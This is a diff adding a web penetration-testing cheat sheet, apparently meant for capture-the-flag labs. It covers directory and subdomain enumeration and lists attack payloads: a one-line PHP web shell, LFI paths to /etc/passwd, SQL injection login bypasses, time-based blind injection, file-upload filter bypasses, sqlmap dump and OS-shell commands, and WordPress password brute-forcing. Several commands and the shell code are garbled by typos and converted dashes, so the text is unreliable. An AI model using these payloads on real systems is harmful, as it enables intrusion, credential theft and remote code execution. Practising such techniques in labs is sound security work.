@@ -1,0 +1,84 @@
+* Read Entire page
+  * look for emails, names, user info
+
+* Source code
+
+* Nikto
+  * nikto -h 10.10.10.10 –output filename
+
+* Subdomains:
+  * Dirb
+    * dirb http://10.10.10.10/
+  * dirbuster
+    * GUI version
+
+* gobuster
+    * gobuster -w /wordlist.txt -u http://10.10.10.10/ -x php,txt,html
+      * use -r (recursive) or try found folders.
+
+* wfuzz
+    * wfuzz -w /wordlist -u tsreetfight.htb/FUZZ –hw 717
+    * wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt –hc 404 http://10.10.10.86/FUZZ
+
+* Web Extensions
+    * sh,txt,php,html,htm,asp,aspx,js,xml,log,json,jpg,jpeg,png,gif,doc,pdf,mpg,mp3,zip,tar.gz,tar
+
+* Creating wordlist from webpage
+  * cewl
+
+* Burp intercept
+  * compare “host:”
+  * crsf token = no bruteforce
+  * add php code if url has anything.php
+    * <?php syetm ($_REQUEST(‘please subscribe’)’ ?>
+  * anything being executed?
+    * try directory traversal
+    * ../../../home
+
+* LFI/RFI
+  * folder that always exist
+    * /etc/hosts /etc/resolv.conf
+    * add %00jpg to end of files
+    * /etc/passwd%00jpg
+    
+* Sign in Page
+    * SQL Injection
+      * ‘or 1=1– –
+      * ‘ or ‘1’=1
+      * ‘ or ‘1’=1 — –
+      * ‘–
+      * Use known Username
+        * tyler’ — –
+        * tyler’) — –
+      * bruteforce — bart
+      
+* check website version
+
+* redirecting webpage automatically?
+  * noredirect plugin
+
+* powershell – bart
+
+* File Upload
+  * Blacklisting bypass
+    * bypassed by uploading an unpopular php extensions. such as: pht, phpt, phtml, php3, php4, php5, php6
+  * Whitelisting bypass
+    * passed by uploading a file with some type of tricks, Like adding a null byte injection like ( shell.php%00.gif ). Or by using double extensions for the uploaded file like ( shell.jpg.php)
+
+* Sqlmap
+    * sqlmap -u https://IP/ –crawl=1
+     * Find SQL in webpage url automatically   
+    * sqlmap -u https://IP –dbs=mysql –dump –threads=5
+    * sqlmap -u https://IP –os-shell 
+     * execute shell commands
+
+* Bind SQL
+  * Time Based
+    * http://IP/item.php?id=34 and if(1=1, sleep(10), false)
+      * should take atleast 10 seconds to load page
+    * http://IP/anything.php?id=1-sleep(5)
+    
+* WordPress
+  * wpscan -u IP
+  * wpscan -u IP –enumerate u
+  * wpscan -u IP -U admin -w /wordlist.txt
